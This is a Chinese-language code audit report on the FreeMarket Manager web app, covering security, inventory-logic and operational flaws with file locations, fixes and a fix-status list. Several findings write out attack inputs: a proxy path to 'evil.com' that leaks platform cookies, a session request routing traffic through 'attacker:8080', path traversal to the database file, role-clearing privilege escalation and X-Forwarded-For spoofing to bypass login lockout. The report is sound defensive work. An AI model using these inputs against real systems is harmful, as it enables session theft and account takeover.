# FreeMarket Manager 安全 / 逻辑 / 操作漏洞审计报告

- 审计日期：2026-11-26
- 范围：`backend/`（FastAPI、任务队列、自动化、Node 反向代理）与 `webside/` 前端，基于当前 `main` 工作区（含未提交的雅虎一键发送改动）
- 方式：只读代码审计，分五个方向并行进行（认证权限 / 公开接口与注入 / 代理与配置 / 业务逻辑 / 操作风险）。未启动服务，未改代码，未连任何数据库。
- 标注 **[已核实]** 的条目已对照源码逐行确认；**[待确认]** 的需要实测才能定论。

---

## 一、总览

| 级别 | 数量 | 最需要先处理的 |
|---|---|---|
| 高 | 12 | Cookie 代理开放转发、web-drive 无权限、会话可指定外部代理、自清角色提权、同步库可清空正式库、出品图片任意文件 / SSRF、强制出库回吐 |
| 中 | 15 | 明文泄露 DeepSeek Key / 抓包令牌、公开端点刷满磁盘、`sync.ffs_db` 泄露文件清单、重试重复执行 |
| 低 | 约 15 | 并发窄窗口、缺确认按钮、登录细节 |

整体基础不错：SQL 全部参数化，排序字段都走白名单；没有命令执行或反序列化；上传有图片校验；前端没有 `v-html`；JWT 密钥是随机生成的；密码使用 PBKDF2 加盐，比较是恒定时间；SSO 的 state、nonce、PKCE 都齐全；雅虎和煤炉的发货、退货流程大多做了回读校验。问题主要集中在**接口组的权限缺口**、**反向代理的目标校验**、**数据库运维操作的防呆**，以及**库存回吐口径**这四处。

---

## 二、安全漏洞

### 高

**S1. mercari-proxy 的 `/__p/<host>/` 可以转发到任意主机，注入的平台 Cookie 会随请求发出** [已核实]
- 位置：`backend/src/mercari_proxy/server.js:488-492`（`resolveTarget`）、`server.js:458-484`（WebSocket upgrade 中的 `tls.connect(443, host)`）
- 问题：改写链接时会用 `site.re` 过滤，但入站请求解析目标时不过滤，`/__p/` 后面的 host 被原样当作上游；Cookie、Authorization、DPoP 都会照常转发。
- 利用：用户点过「Cookie 访问」后的 1 小时内，只要点开 `https://<代理域名>/__p/evil.com/x`（链接可以藏在任意网页或买家留言里），浏览器就会带上 `__mp_sess` 和注入的煤炉/雅虎 Cookie。代理把它们发给 evil.com，HttpOnly 也拦不住。evil.com 返回的页面运行在代理源上，还能继续调 `/__p/jp.mercari.com/...` 操作账号。持票者也能借它访问内网任意 https 主机（SSRF）。
- 修复：`resolveTarget` 和 upgrade 都要求 host 命中 SITES 的正则，不命中返回 403；host 中带端口的直接拒绝。

**S2. `/web-drive/*` 的出品、删除、修改、暂停、恢复只要求登录** [已核实]
- 位置：`backend/src/use_web/web_drive/API.py:28-44`；`use_web/API.py` 只挂了 `_AUTH`。
- 利用：一个只能看控制台的角色，直接 POST `/web-drive/on-sale/delete-item`、`revise-item`、`suspend-item`、`resume-item` 或 `listing/post-to-market`，就能绕过 `on-sale-items:*`、`inventory:listing` 等功能权限。post-to-market 还会绕过任务队列的可上架预扣，可能导致重复出品。
- 修复：每个路由挂上与 `TASK_FEATURES` 相同的 `require_feature`。前端已经不用的路由直接删掉。

**S3. `/web-drive/sessions/open` 接受调用方传入的 `mitm_proxy_url`，可以把店铺登录态送到攻击者的代理** [已核实]
- 位置：`use_web/web_drive/units/web_drive_handler/sessions.py:45-63`；`web_drive/core/manager/_mixin_sessions.py:401-405`（设了 proxy 就 `ignore_https_errors=True`）。
- 利用：任意登录用户提交 `{"account_key":"mercari_1","use_mitm_proxy":true,"mitm_proxy_url":"http://attacker:8080"}`。服务端会用该账号已登录的 profile、通过攻击者的代理、在忽略证书错误的情况下访问平台，Cookie 和令牌全部泄露。
- 修复：删除 `mitm_proxy_url` 入参，只用 `default_mitm_proxy_url()`；sessions 相关接口挂 `shop-accounts:browser`；`start_url` 限定在平台域名内。

**S4. 有「账号管理」功能的非管理员可以清掉自己的角色，变成不受任何限制的用户** [已核实]
- 位置：`use_web/system/units/users_handler.py:186-191`；配合 `page_access.py` 里「`role_id` 为 NULL 即不受限」的规则。
- 利用：拥有 `system/config:accounts` 的人调用 `PUT /system/users/{自己的id}`，传 `{"clear_role":true}`。之后所有页面和功能全部开放，包括数据库切换、重启、图床、SSO。对其他非管理员也能这样操作。
- 修复：非管理员不能修改自己的 `role_id`，也不能清空任何人的角色（清空等于授予全部权限）。长期看，「未分配角色 = 不受限」应收敛为只对历史老账号生效。`system/config:roles` 修改自己所在角色的情况同样建议禁止。

**S5. 出品图片路径没有校验：可读任意本地文件、路径穿越、任意 URL 下载（SSRF）** [已核实]
- 位置：`backend/src/web_drive/listing/units/post_to_macket/_helpers.py:41-76`（`_resolve_image_to_local`）。
  - `/imges/` 分支直接 `os.path.join`，没有走 `resolve_within_imges`，`/imges/../../mercariDB.db` 可以穿出目录。
  - 绝对路径分支原样返回服务器上的任意文件。
  - `http(s)://` 分支用裸 `urllib.request.urlretrieve`，没有白名单，也不校验内网地址。
- 入口：`PostToMarketBody.image_urls`（任务 payload 原样透传）；`PUT /inventory/{pid}` 可以写入任意 `images_json`，之后自动补挂会读取它。
- 修复：只接受 `/imges/` 前缀，统一走 `image_storage.local_abs_path`；删掉绝对路径分支；http 分支删除，或改用 `mercari_cdn_fetch` 的白名单抓取。入队时也做同样的校验。

**S6. 门户 SSO 首次登录按用户名自动绑定，管理员也不例外** [已核实，可利用性取决于门户]
- 位置：`backend/src/portal_sso/identity.py:88-104`
- 利用：如果门户允许自助注册或修改用户名，一个名叫 `admin` 的门户账号第一次登录时，会自动绑定到本地管理员。
- 修复：自动绑定时跳过 `is_admin=1` 的账号，管理员改为手工绑定。

### 中

**S7. `GET /system/deepseek-config` 向所有登录用户返回明文 API Key** [已核实]
- 位置：`use_web/system/API.py:218`、`units/ai_config_handler.py:20-25`
- 修复：参照图床和 SSO 的做法，只返回 `api_key_set`；GET 挂 `_cfg("ai")`。

**S8. `GET /system/ssl-mitm/last-capture` 向所有登录用户返回煤炉 Authorization 和 DPoP** [已核实]
- 位置：`use_web/system/API.py:278`、`ssl_mitm_proxy/mitm_addon.py:83-98`
- 问题：店铺账号列表专门隐藏了这些头，这里却原样返回。
- 修复：挂 `_cfg("service")`，返回时只保留键名、去掉值。

**S9. `/imges/sync.ffs_db` 无需登录即可下载，暴露整个图片目录的文件名清单** [已核实文件存在且可公开访问；内容格式待确认]
- 位置：`backend/imges/sync.ffs_db`（FreeFileSync 的同步数据库，36KB），由 `src/image_route.py:56-76` 对外提供，没有扩展名白名单。
- 后果：图片目录原本靠 UUID 文件名不可猜来保护。拿到清单后，可以下载发货二维码（`qr_m*`，可能被人抢先在便利店使用）、交易留言图片、扫码照片。
- 修复：删除该文件，把 FreeFileSync 的同步库移出 `imges/`；`serve_image` 只放行 jpg/jpeg/png/webp/gif/avif。

**S10. 两个公开图片端点可以被持续刷出缓存文件，直到磁盘写满** [已核实]
- 位置：
  - `use_web/inventory/units/inventory_public_handler.py:62-104`：`size` 可以取 50 到 1200 之间的任意整数；来源路径还可以指向 `_thumbs/` 本身。
  - `use_web/mercari_image/proxy_handler.py:202,266`：缓存键包含整个查询串。
- 后果：`maintenance.py` 只在启动时清理一次，磁盘写满后 SQLite 的 WAL 写不进去，整个系统停摆。
- 修复：size 只允许几个固定档位；禁止 `_thumbs/`、`_mercari_cache/` 作为来源；缓存键去掉查询串；维护清理改为周期执行。

**S11. 测试 MySQL 连接时密码留空会沿用已保存的密码，目标主机却可以任意填写** [已核实；能否拿到明文密码待实测]
- 位置：`use_web/system/units/db_admin_handler.py:76-93`、`db_sync_handler.py:50-63`
- 利用：填自己控制的主机、密码留空，后端会拿正式库的密码去连。恶意服务端可以要求 `mysql_clear_password` 认证，从而拿到明文密码。报错信息原样回显，也能用来探测内网端口。
- 修复：只有 host/port/user 与已保存的配置完全一致时，才沿用旧密码；禁用 clear_password 认证插件；报错文案做泛化处理。

**S12. 三类系统任务不在 `TASK_FEATURES` 里，任何登录用户都能提交** [已核实]
- 位置：`page_access.py:209-233`
- 涉及类型：`system.shipping_duration`（整批修改全部在售商品的发货时效，并长时间占住唯一的 worker）、`system.profile_hide`、`system.barcode_history`。
- 修复：补上这三个类型的功能权限；不在白名单中的任务类型一律拒绝，而不是默认放行。

**S13. 开发模式（`start.bat`）下，登录失败锁定可以靠伪造 X-Forwarded-For 绕过** [待确认，两路审计结论不一致]
- 位置：`webside/vite.config.js:114-118`；后端 `proxy_headers=True`，并信任来自 127.0.0.1 的转发头。
- 分析：Vite 代理从 127.0.0.1 发出请求，会原样透传客户端自带的 XFF，后端于是把伪造值当作客户端 IP。登录锁定的键是「用户名|IP」，换一个 XFF 就是一个新键，可以无限暴力尝试，再加上默认的 admin/admin。如果实测发现 XFF 没有被透传，结论就反过来：所有访客共用一个限速桶，一个人就能让大家都拿到 429。
- 修复：Vite 代理在 `configure` 中先删除入站的 XFF 再追加真实对端；登录锁定再加一层只按用户名计数的阈值；首次登录强制修改默认密码。

### 低
- **S14** 店铺账号组设置了 `reads_open=True`，导致退货地址（姓名、电话、住址）对所有登录用户可读：`shop_accounts/API.py:74`。
- **S15** 任务重试不检查 `TASK_PAYLOAD_FEATURES`，没有 relink 权限的用户可以重试带 `relink_inventory_id` 的任务：`tasks_handler.py:167-170`。
- **S16** `product-types`、`yahoo-category-mappings` 的写接口，`gotion` 整组，以及 `use_mercari` 的 `sync-new-data` / `batch-refresh-info`，都只要求登录。
- **S17** 只拥有「历史库存」页的角色，带上 `X-Inventory-Archive: 1` 头就能读到当前的在售和流水数据（只读越权）。
- **S18** 登录相关：先判断账号是否禁用、后校验密码，可以用来探测账号状态；`_ATTEMPTS` 字典没有容量上限；修改密码时校验原密码没有限速；默认 admin/admin 没有强制修改。
- **S19** `/__inject` 在 `x-internal-secret` 为空时会跳过校验，比较也不是恒定时间（目前密钥一定会生成，所以实际不可利用）。
- **S20** `/imges/...?inline=1` 是一个不限速的图床中转：`image_route.py:68`。
- **S21** JWT 默认永不过期并存放在 localStorage，一旦出现任何 XSS 后果就会放大。建议设置 `JWT_EXPIRE_HOURS`。
- **S22** `Todos/script.js:3060` 唯一一处 `dangerouslyUseHTMLString`，拼接了平台返回的确认码；建议先转义。

---

## 三、逻辑漏洞（库存 / 订单 / 金额）

### 高

**L1. 「强制出库」的明细在取消、删除或改绑时会被回吐，凭空多出库存** [已核实]
- 位置：`use_web/orders/units/orders_outbound/force.py:29-35`；`orders_outbound/lines.py:24-28`（`_is_stock_holding_line` 只要 `is_stocked_out==1` 就算占用）。
- 场景：强制出库只设置 `is_stocked_out=1`，不扣库存。订单之后被取消，`restock_order_holding_lines` 会把 `qty` 加回库存。
- 修复：强制出库另加一个标记列；回吐和改绑只针对真正扣过库存的行。

**L2. 雅虎订单经刷新 / 批量更新状态 / 通知变成 cancelled 时，不回吐库存、不回滚包材** [待复核，审计代理已逐行核对]
- 位置：`use_yahoo/orders/sold_sync.py:465,475` → `_upsert_order` 直接写入状态；`get_order_list.py:157`。
- 修复：在 `_upsert_order` 中检测「旧状态不是 cancelled、新状态是 cancelled」的情况，走与 `_mark_order_cancelled` 相同的回吐流程。

### 中

**L3. 扫码出库是先读后写，在 MySQL 上会被并发扣成负数** [已核实]
- 位置：`use_web/inventory/units/inventory_stock.py:76-85`。读的是事务内的快照，随后是无条件的 `SET quantity = quantity - ?`。CLAUDE.md 恰好把这个文件列为正确写法的范例。
- 修复：改成 `WHERE id=? AND COALESCE(quantity,0) >= ?`，并检查 `rowcount`。

**L4. 出库明细重建时，已出库的状态按 `(kind, mid, qty)` 精确继承** — `outbound_sync.py:265-301, 332-351, 406-413`
- 场景一：订单说明里 `1234×1` 改成 `×2` 后，新行变成「未出库」，再出库一次就重复扣减。
- 场景二：说明被清空时，占着库存的明细行直接被删除，既不回吐，也不留痕迹。
- 只影响手动入口：编辑说明、重新匹配、重新获取详情。
- 修复：按库存 id 和件数继承；继承不完的部分，要么拒绝重建，要么先回吐再删除。

**L5. 改绑库存与取消订单并发时，同一行会被回吐两次** — `orders_outbound/lines.py:107-188`。修复：改绑在事务内用条件 UPDATE 认领这一行。

**L6. 快递单「撤回」可以重复执行，在途数量被扣两次** — `inbound_shipments/shipments.py:208-238`。修复：事务一开始就执行 `UPDATE ... SET status='draft' WHERE id=? AND status='shipped'`，并检查是否命中。

### 低
- **L7** 组合商品级联扣减时，子商品扣到 0 就停，取消时却按满额加回：`inventory_counters.py:242-252` 对比 `316-319`。
- **L8** 删除批次用的是事务外读到的数量：`inventory_batches.py:445-466`。
- **L9** 扫码入库时，总数和批次写在两个事务里，批次或货架归属可能错位：`inventory_stock.py:22-57`。
- **L10** 同条码合并在 MySQL 上是先读后写：`inventory_barcode/merge.py:80-190`。
- **L11** 出品预扣的 `consume` 和 `sweep_stale` 都用快照值写回，并发时会重复释放：`reservations.py:201-224, 280-293`。
- **L12** 煤炉取消订单时，「改状态」和「回吐」不在同一个事务里：`get_order_info.py:384-398`。
- **L13** [待确认] 改绑归档表的已出库明细时，会从新库存再扣一次（盘库前已经发出的货）；`DELETE /orders/{id}` 删除已发货订单时也会回吐库存。

已确认没有问题的口径：可上架的三处计算一致；结算归属都用 `OWNER_SQL`；6 个 UPSERT 目标表各只有一个唯一索引；管理番号映射都走 `_resolve_inventory_id`。

---

## 四、操作漏洞（误操作 / 重试 / 重启造成的不可逆后果）

### 高

**O1. 同步库的「目标 ≠ 当前库」只比较字符串，而且不阻止目标是正式库** [已核实]
- 位置：`backend/src/db_auto_sync.py:153-161`；`db_manage/migrate.py:153-164` 会先 DROP 目标库的全部表。
- 场景一：当前库是 `127.0.0.1/mercari`，目标填 `localhost/mercari`，字符串比较认为是两个库，于是边读边删当前库，数据全部丢失。
- 场景二：当前库是 `freemarket_test`，目标填 `mercari`，并开了自动同步，每 N 分钟测试数据就会把正式库整库覆盖一次。
- 修复：连上目标后比较 `@@server_uuid` 和 `DATABASE()`；目标不在测试库白名单里时拒绝，或要求输入库名二次确认。

**O2. 热切库只检查 `sync_lock`，不等待正在运行的任务** [已核实]
- 位置：`use_web/system/units/db_admin_handler.py:222-283`
- 场景：worker 正在执行出品或发货，这时切换库。任务收尾的 `UPDATE task_queue` 和预扣核销会写进新库，可能改到同 id 的无关任务和商品；新库里原有的 pending 任务也会马上被 worker 领走，对真实账号执行。
- 修复：热切前要求没有 running 任务，切换期间暂停 worker；切换后提示新库中还有 N 条待执行任务。

**O3. 出品预扣的 TTL 从 `created_at` 开始算，排队久的出品刚跑完就可能被释放** [已核实]
- 位置：`task_queue/reservations.py:286`
- 场景：前面排着一条几小时的 `system.shipping_duration`，出品任务执行完时已经超过 6 小时；或者重启后被标为 failed 的旧出品任务。下一次 sweep 会在在售同步核销之前释放预扣，可上架数回升，随后发生重复出品。这与 CLAUDE.md 写的「保持占用到 TTL」不符。
- 修复：TTL 改为从 `finished_at` 开始算。

### 中
- **O4** 任务页「重试」既没有确认也没有防连点，而且同一个失败任务可以无限次重试：`views/Tasks/script.js:183-188`、`tasks_handler.py:152-189`。对 `todos.send_message`（可能已经发出）、`inventory.listing`（没有去重键）会造成重复发言、重复挂牌。修复：加确认框和 loading；每个原任务只允许重试一次；无法判定是否已执行的类型禁止重试。
- **O5** 前端的 `client_token` 每次调用都会新生成，所以双击防护实际不生效：`webside/src/utils/taskSubmit.js:25`。修复：在点击开始时生成 token，loading 期间复用同一个。
- **O6** 煤炉下架点了「削除する」就算成功，没有确认商品真的已经删除：`web_drive/delete/units/delete_order.py:210-262`。修复：同步后确认该 item 已经不在列表中，否则抛错（雅虎侧已经做了这种回读）。
- **O7** 「数据迁移」可以把 SQLite 整库覆盖到任意 MySQL 库，确认框里不显示库名：`db_admin_handler.py:157-205`。
- **O8** 热切到一个输错的库名，会对该库执行「删除未知表」，确认文案没有提到这一点：`db_admin_handler.py:270`。

### 低
- **O9** 出品预扣和重试都不检查 `is_delete`，已软删的商品照样能挂出去：`reservations.py:63-73`。
- **O10** 发货扫码是先入队、后写 `ship_qr_state='shipping'`。如果任务很快失败，这一行会卡在「发货中」：`qr_photo.py:427-445`（概率低，待确认）。
- **O11** `DELETE /orders/{id}` 是硬删并回吐库存，而增量同步不会把订单拉回来（前端目前没有入口）：`orders_crud.py:184-202`。
- **O12** 两个按钮缺少确认：待结算物品「删除」（`views/system/Settlement/index.vue:189`）、清空雅虎 App 令牌（`views/ShopAccounts/index.vue:179`）。

已确认做得好的部分：雅虎 App 发码和通知前都会回读状态；新增的雅虎一键发送先读 App 状态再执行；煤炉发货有已发送检测；退货地址防重填并回读比对；同意退货先读状态；改价校验是否离开编辑页；前端主要的不可逆按钮都有确认框和 loading。

---

## 五、建议修复顺序

1. **今天就能做、风险最大的**：S1（代理 host 白名单）、S2 / S3（web-drive 加权限，删 `mitm_proxy_url`）、S4（禁止自清角色）、S9（删 `sync.ffs_db`，加扩展名白名单）、S7 / S8（两处明文泄露）。
2. **数据安全**：O1、O2、O7、O8（数据库运维防呆）、S5（出品图片路径）、S12（任务白名单默认拒绝）。
3. **库存正确性**：L1、L2、L3、O3、L4。
4. **防误操作**：O4、O5、O6、S10、S11、S13。
5. 其余低危按方便时处理。

## 六、局限
- 纯静态审计，没有对运行中的实例做验证；「待确认」的条目需要实测。
- 门户（`D:\Project\Portal`）和 nginx 部署配置不在仓库内（CLAUDE.md 提到的 `deploy/nginx-fmm.conf.example` 不存在），因此 HTTPS 强制、图床域名保护等实际部署情况没有覆盖到。
- 每个方向的覆盖率受审计时长限制，不能等同于「已无其他漏洞」。

---

## 七、修复状态（2026-11-26）

**已修复**：S1–S5、S7–S16、S18–S20、S22；L1–L6、L8、L12、L13（改绑归档明细部分）；O1–O9、O12。

**未修复 / 有意保留**：
- S6 门户 SSO 按用户名自动绑定管理员：取决于门户是否允许自助注册 / 改名，待确认后再动。
- S9 `backend/imges/sync.ffs_db`：现在已经无法通过 `/imges` 下载（只放行图片扩展名），但文件本身还在，建议把 FreeFileSync 的同步库移出 `imges/`。
- S17 历史库存页越权读、S21 JWT 永不过期：属于设计取舍，未改。
- L7 组合商品回吐、L9 扫码入库分两个事务、L10 同条码合并读后写、L11 预扣快照写回：都是窄窗口，改动面大，未改。
- L13 删除已发货订单会回吐库存（前端没有入口）、O10 扫码发货的状态竞态（概率低）：未改。
- `gotion` 接口组只要求登录（前端没有对应页面）：未改。
- 已有的「强制出库」行无法回溯区分（新加的 `force_stocked_out` 列只对今后的强制出库生效）。如需补标，可按 `system_logs` 里「强制出库（未扣库存）」的 `line_id` 手动处理。
